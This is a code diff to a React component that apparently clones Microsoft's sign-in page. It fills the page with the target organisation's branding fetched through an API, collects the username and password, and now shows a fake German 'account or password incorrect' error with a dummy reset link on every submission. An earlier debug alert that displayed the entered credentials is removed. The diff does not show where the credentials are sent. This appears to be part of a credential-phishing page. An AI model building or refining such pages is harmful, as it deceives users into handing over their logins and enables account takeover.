@@ -147,6 +147,7 @@ function PasswordPage(props: {
   username: string;
   password: string;
   boilerplateText?: string;
+  passwordInvalid?: boolean;
   onPasswordChange?: InputHandler;
   onBack?: ClickHandler;
   onSubmit?: ClickHandler;
@@ -185,7 +186,18 @@ function PasswordPage(props: {
             </div>
             <div className="row">
               <div className="form-group col-md-24">
-                <div role="alert" aria-live="assertive"></div>
+                <div role="alert" aria-live="assertive">
+                  {props.passwordInvalid ? (
+                    <div id="passwordError" className="error ext-error">
+                      {
+                        "Ihr Konto oder Kennwort ist nicht korrekt. Wenn Sie Ihr Kennwort nicht mehr wissen, "
+                      }
+                      <a id="idA_IL_ForgotPassword0" href="#" role="link">
+                        {"setzen Sie es jetzt zurück."}
+                      </a>
+                    </div>
+                  ) : null}
+                </div>
                 <div className="placeholderContainer">
                   <input
                     name="passwd"
@@ -382,6 +394,7 @@ function LightboxTemplateContainer(props: {
 export default function MSConvergedSignInPage() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
+  const [passwordInvalid, setPasswordInvalid] = useState(false);
   const [page, setPage] = useState<"username" | "password">("username");
 
   const branding = api.branding.getBranding.useMutation();
@@ -392,6 +405,10 @@ export default function MSConvergedSignInPage() {
     console.log("Branding Data:", data);
 
     setPage("password");
+  };
+
+  const onPasswordSubmit = () => {
+    setPasswordInvalid(true);
   };
 
   return (
@@ -413,11 +430,10 @@ export default function MSConvergedSignInPage() {
           username={branding.data?.userDisplayName ?? username}
           password={password}
           boilerplateText={branding.data?.boilerplateText}
+          passwordInvalid={passwordInvalid}
           onPasswordChange={setPassword}
           onBack={() => setPage("username")}
-          onSubmit={() => {
-            alert(`Signing in with ${username} and password: ${password}`);
-          }}
+          onSubmit={onPasswordSubmit}
         />
       ) : null}
     </LightboxTemplateContainer>
